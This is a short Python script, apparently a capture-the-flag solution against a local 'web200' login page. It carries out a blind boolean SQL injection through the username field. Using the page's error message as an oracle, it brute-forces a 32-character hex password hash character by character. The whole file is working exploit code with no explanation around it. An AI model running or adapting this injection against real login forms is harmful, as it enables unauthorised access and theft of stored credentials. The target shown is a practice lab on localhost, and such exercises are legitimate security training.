#!/usr/bin/python
# -*-  coding:utf-8 -*- 
import requests 
url = "http://127.0.0.1/web200/login.php"

randstr = "0123456789abcdef"
remark=""
proxy = {"http":"127.0.0.1:8080"}
for j in range(1,33):
    for i in randstr:
        passwd = i+remark
        uname = "'!=(mid((passwd)from(-{j}))='{passwd}')='1".format(j=str(j),passwd=passwd)
        data = {"uname":uname,"passwd":"ddd"}
        # print uname
        res = requests.post(url,data)
        if "password error!!" in res.text:
            remark = passwd
            print remark
            break